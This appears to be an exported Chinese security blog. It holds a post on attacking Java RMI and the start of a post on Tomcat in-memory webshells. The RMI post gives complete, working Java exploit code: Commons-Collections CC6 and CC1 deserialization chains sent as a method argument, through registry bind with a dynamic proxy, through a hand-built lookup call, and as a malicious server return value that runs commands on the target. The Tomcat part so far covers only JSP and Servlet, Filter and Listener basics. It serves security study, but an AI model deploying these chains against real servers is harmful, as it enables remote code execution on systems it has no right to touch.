远程方法的调用时机发生在服务端。当注册的远程对象上存在某个恶意方法，我们可以在客户端调用这个方法来攻击服务端。比如假设服务端有如下方法的代码：\n客户端如下调用这个方法：\n1 2 RMIInterface o = (RMIInterface) Naming.lookup(\u0026#34;Hello\u0026#34;); System.out.println(o.evil(\u0026#34;calc\u0026#34;)); 这样就能成功在服务端调用这个恶意方法。\n（个人感觉利用点不高）\n恶意服务参数 在Client 端获取到Server端创建的Stub后，会在本地调用这个Stub 并传递参数，Stub会序列化这个参数，并传递给Servre端。Server端会反序列化Client端传入的参数并进行调用，如果这个参数是Object类型的情况，Client端可以传给Server端任意的类，直接造成反序列化漏洞。\n基本利用 就比如我前面给的远程调用对象RemoteTest.java文件，里面就有一个接收Object类型参数的方法：\n所以我们可以在远程调用这个对象的sayName()方法时传进去一个反序列化payload。\n以CC6为例，所以我们可以如下构造：\nRMIClient.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package Rmi.Client; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.Arrays; import java.rmi.Naming; import Rmi.Server.RemoteInterface; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashSet; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; public class RMIClient{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha =new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hashSet = new HashSet(); hashSet.add(outerMap); haha.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); //获取注册表对象 Registry r = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;,1099); System.out.println(Arrays.toString(r.list())); //寻找对应RMI实例 RemoteInterface o = (RemoteInterface) Naming.lookup(\u0026#34;Hello\u0026#34;); //调用远程对象的方法 System.out.println(o.sayHello()); System.out.println(o.sayName(hashSet)); } } 然后运行服务端和客户端，成功弹出计算机：\n运行结果为：\n1 2 3 [Hello] Hello welcome to use hello[fupanc=1] 其他利用 在前面，我们是保证Server端和Client端调用的服务接口是一样的，那么如果不一致如何利用。\n所以我们可以尝试传递的是 Server 端能找到的参数是 HelloObject 的 Method 的 hash，但是传递的参数却不是 HelloObject 而是恶意的反序列化数据（可能是 Object或其他的类）呢？\n答案是可以的，在 mogwailabs 的 [PPT](https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides Exploiting RMI Services.pdf) 中提出了以下 4 种方法：\n通过网络代理，在流量层修改数据 自定义 “java.rmi” 包的代码，自行实现 字节码修改 使用 debugger 并且在 PPT 中还给出了 hook 点，那就是动态代理中使用的 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法。\nAfant1 师傅使用了 Java Agent 的方式，在这篇文章里，0c0c0f 师傅使用了流量层的替换，在这篇文章里，有兴趣的师傅请自行查看。\n最简单的debugger没复现出来，以后再说吧，学学其他的只有方法，学了java agent后就来把这个复现了。\n利用方面：个人感觉其实还是挺广的，比如服务端要求只接收一个类型的参数，但是我就是要传反序列化的进去。大概就这样解决了。\n总结就是 Server端的调用方法存在非基础类型的参数时，就可以被恶意 Client 端传入\n动态类加载 在前面也说过，RMI的重要特性：动态类加载机制。就是当本地 ClassPath 中无法找到响应的类时，会在指定的codebase 里加载 class。这个特性在 6u45/7u21 之前都是默认开启的。\n为了能够远程加载目标类，需要 Serrver 加载并配置 SecurityManager，并设置java.rmi.server.useCodebaseOnly=false。\nServer 端调用 UnicastServerRef 的dispatch方法处理客户端请求，调用unmarshalParameters方法反序列化客户端传来的参数。\n这个方法的反序列化由MarshalInputStream类实现，跟进它的resolveClass方法：\n这里通过readLocation()方法获取codebase地址。\n然后需要满足useCodebaseOnly为false，然后才能传入codebase变量。\n然后调用RMIClassLoader#loadClass()方法来加载类，实际上委托的是sun.rmi.server.LoaderHandler.loadClass方法。\n方法中调用到了loadClassForName()方法\n通过 Class.forName() 传入自定义类加载器 LoaderHandler$Loader 来从远程地址加载类。\n而 LoaderHandler$Loader 是 URLClassLoader 的子类。\n最后会调用到URLClassLoader.loadClass方法来加载类\n因此 Client 端可以通过配置此项属性，并向 Server 端传递不存在的类，使 Server 端试图从 java.rmi.server.codebase 地址中远程加载恶意类而触发攻击。\n替身攻击 当远程对象接收参数类型不再是Object，而是指定类型（远程对象类型）。\n而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为HashMap的exp，那么攻击者在本地的环境中将HashMap重写，让HashMap继承注册的远程对象（RemoteObject）\n（了解一下这个思路，其实和前面说的那个有点重合了。不多说）\n攻击注册中心 对应的反序列化触发点在RegistryImpl_Skel类的dispatch()方法。当调用Naming.lookup()方法或bind()方法时，都会调用到这个dispatch()方法中，也就是对应的switch/case方法。\n注册中心的基本方法：\nbind() list() lookup() rebind() unbind() 前面我们就分析了，在Client端或者Server端调用这些基本方法时，基本都会进入到这里的switch/case语句再次调用。\n并且在这些基本方法中，有的还会反序列化RemoteCall字节流来获取远程对象和RMI服务名称，就有可能会触发反序列化攻击。\n需要注意的是：一般Java远程访问注册中心做了限制，只有来源地址为本地才能调用bind、rebind、unbind方法。\nbind/rebind （一般这个可以归类为服务端攻击）\n这两个方法附近都是调用了反序列化的。 所以这里使用这两个都是可以的。\n而bind()方法参数需要一个Remote类型的对象：\n如何满足呢，动态代理，这是因为当代理类proxy被反序列化时，被代理对象也会被反序列化，自然也会执行POC链。\n操作点就很多了，在CC1中利用AnnotationInvocationHandler，它是InvocationHandler的子类，可以再次借用，来修改传入参数的类型。如下操作：\nCC1+动态代理：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package Rmi.Server; import java.rmi.Remote; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Proxy; import java.lang.annotation.Retention; public class RMI_attack { public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Class[] interfaces = LazyMap.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),interfaces,handler); Object o = constructor1.newInstance(Retention.class,proxyMap); Remote proxy = (Remote)Proxy.newProxyInstance(Remote.class.getClassLoader(),new Class[]{Remote.class},(InvocationHandler)o); Registry r = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;,1099); r.bind(\u0026#34;fupanc\u0026#34;,proxy); } } 这里用的LazyMap链，同样的TransformedMap链也能用。\n（但是有点小怪的就是不应该只有8u71以下才能弹吗，8u411也能弹了？）\nunbind/lookup 这两个方法的利用也许有JDK版本要求？JDK8u411并没有看到反序列化，而JDK8u71却有反序列化操作。这里先用JDK8u71看看。\n（虽然注册中心有限制，但是lookup()方法在客户端也是能用的）\n在JDK8u71中，这两个方法也存在反序列化：\n如果能控制var10，就能造成任意类反序列化。即现在需要控制这个var2，虽然这改成了8u71，但是过程差不多。\n溯源一下参数，可以发现这里的var2就是StreamRemoteCall对象，也就是那个连接对象。\n相关的传输过程：\n这里就是调用的Invoke()方法来传输数据。\n所以我们可以调用this.invoke方法来传输请求到注册中心。需要的参数如下：\n先获取对应的RegistryImpl_Stub对象：\n1 Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;, 1099); 然后获取到这个ref变量，这个ref是Registryimpl_Stub类的父类的父类的变量，这个变量的赋值在前面注册中心创建那里是说明了的，如下代码获取：\n1 2 3 Field field0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredField(\u0026#34;ref\u0026#34;); field0.setAccessible(true); UnicastRef unicastRef = (UnicastRef)field0.get(registry); 这里获取到连接对象还需要获取到operations变量的值，如下：\n1 2 3 Field field1 = registry.getClass().getDeclaredField(\u0026#34;operations\u0026#34;); field0.setAccessible(true); Operation[] operation = (Operation[])field1.get(registry); 然后直接拼接进恶意类即可，我这里使用CC6，注意点细节还是很好看懂的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package Rmi.Server; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import sun.rmi.server.UnicastRef; import java.io.ObjectOutput; import java.lang.reflect.Field; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.Operation; import java.rmi.server.RemoteCall; import java.rmi.server.RemoteObject; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashSet; public class RMI_attack { public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha =new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hashSet = new HashSet(); hashSet.add(outerMap); haha.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); //恶意发包 Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;, 1099); //ref Field field0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredField(\u0026#34;ref\u0026#34;); field0.setAccessible(true); UnicastRef unicastRef = (UnicastRef)field0.get(registry); //operation Field field2 = registry.getClass().getDeclaredField(\u0026#34;operations\u0026#34;); field2.setAccessible(true); Operation[] operation = (Operation[])field2.get(registry); RemoteCall var2 = unicastRef.newCall((RemoteObject)registry, operation, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(hashSet); unicastRef.invoke(var2); } } 攻击Client端 如果攻击的目标作为Client端，也就是在Registry/Server端可控时，也是可以导致攻击的。客户端主要有两个交互行为，第一是从Registry端获取调用服务的Stub 并反序列化，第二步是调用服务后获取执行结果并反序列化。\n有如下几个利用点：\n恶意Server Stub： Client端在Registry端lookup后拿到的在Server端在registry端注册的 代理对象并反序列化触发漏洞。\n恶意Server 端返回值 就是Server端返回个iClient端恶意的返回值，Client端反序列化触发漏洞。\n动态类加载： 同攻击Server端的动态类加载，Server端返回给Client端不存在的类，让Client端去codebase地址远程加载恶意类触发漏洞。\n简单以Server端为例：\nRemoteTest类代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package Rmi.Server; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashSet; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; public class RemoteTest extends UnicastRemoteObject implements RemoteInterface { protected RemoteTest() throws RemoteException{ } public String sayHello() throws RemoteException{ return \u0026#34;Hello welcome to use\u0026#34;; } public Object sayName() throws RemoteException , Exception{ Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha =new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hashSet = new HashSet(); hashSet.add(outerMap); haha.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); return (Object)hashSet; } } 接口哪些简单改改即可，然后客户端调用即可： 成功反序列化。\n参考文章：\nhttps://su18.org/post/rmi-attack/#%E4%B8%80-rmi-%E4%BB%8B%E7%BB%8D\nhttps://nivi4.notion.site/Java-RMI-8eae42201b154ecc89455a480bcfc164\nhttps://www.cnblogs.com/gaorenyusi/p/18329213\n","date":"2024-09-25T22:54:06+08:00","permalink":"https://fupanc-w1n.github.io/p/rmi/","title":"RMI"},{"content":"Tomcat内存马 内存马即仅存在于内存中的无文件恶意代码。也就是无文件落地的 webshell 技术。\nwebshell实际上也是一种web服务，那么从创建web服务的角度来看，有下面几种手段和思路：\n动态注册 servlet/filter/listener（使用 servlet-api的具体实现） 动态注册 interceptor/controller（使用框架如 spring/struts2） 动态注册使用职责链设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline \u0026amp; Valve，Grizzly 的 FilterChain \u0026amp; Filter等等） 使用 java agent 技术写入字节码 Tomcat内存马也是经常用的。\n基础知识 JSP 在学习内存马之前，先了解一下jsp技术。\nJSP全名为Java Server Pages，是一种动态网页开发技术，其根本是一个简化的Serrvlet设计，它是在传统的网页HTML中插入java程序段和JSP标记，从而让形成JSP文件（.jsp），在常见框架中，通常是在tomcat中有所使用，但总的来说jsp现在不是非常常见了。\n语法 脚本程序 脚本程序可以包含任意量的Java语句、变量、方法或表达式，语法格式为：\n1 \u0026lt;% 代码片段 %\u0026gt; 简单给一个jsp示例：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% out.println(\u0026#34;成功调用脚本程序\u0026#34;); %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; JSP声明 一个声明语句可以声明一个或多个变量、方法，供后面的Java代码使用。在JSP文件中，需要先声明这些变量和方法才能使用它们。\nJSP声明的语法格式：\n1 \u0026lt;%! declared; %\u0026gt; 等价于下面的XML语句：\n1 2 3 \u0026lt;jsp:declaration\u0026gt; 代码片段 \u0026lt;/jsp:declaration\u0026gt; 比如：\n1 \u0026lt;%! int i = 0; %\u0026gt; JSP表达式 一个JSP表达式中包含的脚本语言表达式，先被转化成String，然后插入到表达式出现的地方。\n由于表达式的值会被转化成String，所以可以在一个文本行中使用表达式而不用管它是否是HTML标签。\n需要注意的是：表达式元素中可以包含任何Java语言，但是不能用分号来结束表达式。\n语法格式：\n1 \u0026lt;%= 表达式 %\u0026gt; 等价于下面的XML表达式：\n1 \u0026lt;jsp:expression\u0026gt; 表达式\u0026lt;/jsp:expression\u0026gt; 示例：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt; 今天的日期是: \u0026lt;%= (new java.util.Date()).toLocaleString()%\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 页面为： 所以想要在页面上有回显可以使用脚本程序或者表达式。\nJSP注释 JSP注释主要有两个作用：为代码作注释以及将某段代码注释掉。\n语法：\n1 \u0026lt;%--注释--%\u0026gt; 这样注释内容就不会被发送至浏览器并且不会被编译。\nJSP指令 JSP指令用来设置整个JSP页面相关的属性，如网页编码方式和脚本语言。\n语法格式如下：\n1 \u0026lt;%@ directive attribute=\u0026#34;value\u0026#34; %\u0026gt; 指令可以有很多格属性，它们以键值对的形式存在，并用逗号隔开。\nJSP中的三种指令标签：\n指令 描述 \u0026lt;%@ page .. %\u0026gt; 定义网页依赖属性，比如脚本语言、error页面、缓存需求等等 \u0026lt;%@ include \u0026mdash; %\u0026gt; 包含其他文件 \u0026lt;%@ taglib \u0026hellip; %\u0026gt; 引入标签库的定义 简单说说include指令，JSP可以通过include指令来包含其他文件。被包含的文件可以是JSP文件、HTML文件或文本文件。包含的文件就好像是该JSP文件的一部分，会被同时编译执行。\ninclude指令的语法格式如下：\n1 \u0026lt;%@ include file=\u0026#34;文件相对 url 地址\u0026#34; %\u0026gt; 等价的XML语法：\n1 \u0026lt;jsp:directive.include file=\u0026#34;文件相对 url 地址\u0026#34; /\u0026gt; 等可参考：https://www.runoob.com/jsp/jsp-directives.html，还是很有想法的。\nJSP隐式对象 JSP隐式对象时JSP容器为每个页面提供的Java对象，开发者可以直接使用它们而不用显示声明。JSP隐式对象也被称为预定义变量，JSP所支持的九大隐式对象：\n1 2 3 4 5 6 7 8 9 request：HttpServletRequest接口的实例 response：HttpServletResponse 接口的实例 out：JspWrite类的实例，用于把结果输出至网页上 session：HttpSession类的实例 application：ServletContext类的实例 config：ServletConfig类的实例 pageContext：PageContext类的实例，提供对JSP页面所有对象以及命令空间的访问 page：类似与java中的this关键字 Exception：Exception类的对象，代表发生错误的JSP页面中对应的异常对象 详细说明，比如\nrequest对象提供了一系列方法来获取HTTP头信息，cookies，HTTP方法等，服务端需要通过request对象拿到需要的数据，然后做出响应。 常用方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;% request.setAttribute(\u0026#34;name\u0026#34;,\u0026#34;fupanc\u0026#34;);\t//往request对象中存储一个值 key-value的形式 request.setCharacterEncoding(\u0026#34;utf-8\u0026#34;);\t//设置编码格式 request.getParameter(\u0026#34;\u0026#34;);//获取提交的指定参数的值 request.getParameterNames();//返回请求中所有参数的集合 request.getParameterValues(\u0026#34;\u0026#34;);//获取包含指定参数的所有值的数组 request.getAttributeNames();//获取所有属性名称集合 request.getAttribute(\u0026#34;name\u0026#34;);//获取指定属性的属性值,如果不存在返回null request.getCharacterEncoding();//获取编码格式 request.getProtocol();//获取HTTP使用的协议 request.getServletPath();//获取用户提交信息的页面的路径 request.getMethod();//获取用户提交的方式（GET/POST 等） request.getHeaderNames();//返回所有HTTP头的名称集合 request.getHeader(\u0026#34;\u0026#34;);//获取header中指定属性的值 request.getRemoteAddr();//获取用户的ip地址 request.getRemoteHost();//获取用户的主机名 request.getServerName();//获取服务器的名称 request.getServerPort();//获取服务器端口号 request.getCookies();//返回客户端所有的Cookie的数组 request.getSession();//返回request对应的session对象，如果没有，则创建一个 request.getInputStream();//返回请求的输入流 request.getContextPath();//返回request URI中指明的上下文路径 request.getRequestDispatcher(\u0026#34;result.jsp\u0026#34;).forward(request,response);//请求转发 %\u0026gt; response对象对应着http请求的响应，其封装了响应体的信息，我们可以通过response对象向客户端返回数据。 常用方法：\n1 2 3 4 5 6 7 8 9 response.getOutputStream();//返回一个响应二进制的输出流 response.getWrite();//返回可以输出字符的对象 response.sendRedirect(\u0026#34;\u0026#34;);//页面重定向 response.setContextLength(1000);//设置响应头长度 response.setContentType(\u0026#34;text/html; charset=utf-8\u0026#34;);//设置响应的MIME类型 response.getCharacterEncoding();//获取编码格式 response.addCookie(new Cookie(\u0026#34;\u0026#34;,\u0026#34;\u0026#34;));//添加Cookie response.setHeader(\u0026#34;Content-Disposition\u0026#34;,\u0026#34;attachment; filename=fileName\u0026#34;);//配置header，表示浏览器已下载的方式打开文件 response.setStatus(200);//设置响应码 session对象用来跟踪在各个刻画段请求间的会话。 session主要用于会话跟踪，可以用来共享数据，例如登录的用户信息等等。\n一次会话可能包含对此request和response。\n常用方法：\n1 2 3 4 5 6 7 8 \u0026lt;% session.setAttribute(\u0026#34;name\u0026#34;, \u0026#34;yzq\u0026#34;); session.setAttribute(\u0026#34;age\u0026#34;, 25); session.getCreationTime();//获取创建时间 session.getId();//获取sessionid session.invalidate();//取消session，使session不可用 session.removeAttribute(\u0026#34;name\u0026#34;);//移除某个属性 %\u0026gt; out对象用于在response对象中写入内容，有如下方法用来输出： 方法 描述 out.print(data Type dt) 输出Type类型的值 out.println(data Type dt) 输出Type类型的值然后换行 out.flush() 刷新输出流 等\n还有的其他JSP技术参考菜鸟教程的：https://www.runoob.com/jsp/jsp-tutorial.html\nTomcat架构学习 学习Tomcat内存马，自然需要学习Tomcat架构。\nJava Web三大件 Java Web三大件：Servlet，Filter，Listener。\n当Tomcat的web应用程序 接收到请求的时候，依次会经过 Listener -\u0026gt; Filter -\u0026gt; Servlet\nServlet Java Servlet 是运行在Web服务器或应用服务器上的小型Java程序，一般是用来处理客户端请求的动态资源。\n请求的处理过程 客户端发起一个http请求，比如get类型 Servlet 容器接收到请求，根据请求信息，封装成 HttpServletRequest 和 HttpServletResponse 对象。 Servlet 容器调用 HttpServlet 的 init()方法，init方法只在第一次请求的时候被调用。 Servlet 容器调用 service() 方法 service() 方法根据请求类型，分别调用doGet或者doPost方法。 doXXX方法中是我们可以自定义的业务逻辑。 业务逻辑处理完成之后，返回给Servlet 容器，然后容器将结果返回给客户端。 容器关闭时候，会调用 destory 方法。 以上流程可以用如下图片来说明：\n需要注意的是：每次启动tomcat才会初始化Servlet容器，而每次发起一个http请求都会实例化一个Servlet实例（servlet 实例通常只生成一次（或按配置策略生成），然后被容器复用），每次请求时，容器会调用 Servlet 实例的 service() 方法来处理请求，再看是调用后端实现的doGet()还是doPost()等，后端的执行代码会将执行结果再返回给servlet容器，容器再返回给客户端，由此是一个完整的流程。\n比如就可以用如下代码来自定义业务逻辑：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(\u0026#34;/TestServlet\u0026#34;) public class TestServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException { response.getWriter().write(\u0026#34;hello Drunbaby\u0026#34;); } @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } } 当GET请求/TestServlet时，tomcat就会根据 URL /TestServlet 找到对应的 Servlet（通过 @WebServlet 注解或 web.xml 配置映射），也就是上面实现的代码，最后可以实现控制response。\nservlet 生命周期 服务器启动时（web.xml 中配置 load-on-startup=1，默认为0）或者第一次请求该servlet时，机会初始化一个 Servlet 对象，也就是会执行初始化方法 init(ServletConfig conf)。 servlet 对象去处理所有客户端请求，在 service(ServletRequest req，ServletResponse res)方法中执行 服务器关闭时，销毁这个 servlet 对象，执行 destory() 方法。 由 JVM进行垃圾回收。 Filter filter 也称为过滤器，是对 Servlet 技术的一个强补充，其主要功能是对web资源进行拦截，做一些处理后再交给下一个过滤器或servlet处理。通常都是用来拦截request进行处理，也可以对返回的response进行拦截处理。\n工作原理如图： 基本工作原理 Filter 程序是一个实现了特殊接口的Java类，与Servlet 类似，也是由Servlet容器进行调用和执行的 当在 web.xml 注册了一个Filter 来对某个Servlet程序进行拦截处理时，它可以决定是否将请求继续传递给Servlet 程序，以及对请求和响应消息是否进行修改。 当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。 但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象是通过 Filter.doFilter 方法的参数传递进来的。 只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。 如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。 Filter的生命周期 与 servlet 一样，Filter 的创建和销毁也由 Web 容器负责。Web 应用程序启动时，Web 服务器将创建 Filter 的实例对象，并调用其 init() 方法，读取 web.xml 配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter 对象只会创建一次，init 方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。\nFilter 对象创建后会驻留在内存，当 Web 应用移除或服务器停止时才销毁，即会执行destroy方法。在 Web 容器卸载 Filter 对象之前被调用。该方法在 Filter 的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。\n可以用下代码自定义Filter：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package org.example; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebFilter(\u0026#34;/admin/*\u0026#34;) public class Testfilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\u0026#34;Testfilter init\u0026#34;); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse resp = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(false); if (session == null) { resp.sendRedirect(request.getContextPath()+\u0026#34;/login.jsp\u0026#34;); return; } String username = session.getAttribute(\u0026#34;username\u0026#34;).toString(); if(\u0026#34;admin\u0026#34;.equals(username)){ filterChain.doFilter(servletRequest, servletResponse); }else{ resp.sendRedirect(request.getContextPath()+\u0026#34;/login.jsp\u0026#34;); } } @Override public void destroy() { } } 上述代码实现了当访问/admin路由时，会对身份进行判断从而决定是否放行从而调用到servlet。\nFilter链 当多个 Filter 同时存在的时候，组成了Filter链。Web服务器根据Filter 在web.xml文件中的注册顺序，决定先调用哪个 Filter。\n当第一个 Filter 的 doFilter 方法被调用时，web服务器会创建一个代表 Filter 链的 FilterChain 对象传递给该方法，通过判断 FilterChain 中是否还有 Filter 决定后面是否还调用 Filter。\n如下图：\nListener Java Web 开发中的监听器（Listener）就是Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。\n有如下监听器：\nServletContextListenner：对Servlet上下文的创建和销毁进行监听 ServletContextAttributeListener：监听 Servlet 上下文属性的添加、删除和替换 HttpSessionListener：对Session 的创建和销毁进行监听。Session销毁有两种情况，一个是Session 超时，还有一种是通过调用 Session 对象的 invalidate() 方法使 session 失效。 HttpSessionAttributeListener：对Session对象中属性的添加、删除和替换进行监听； ServletRequestListener：对请求对象的初始化和销毁进行监听； 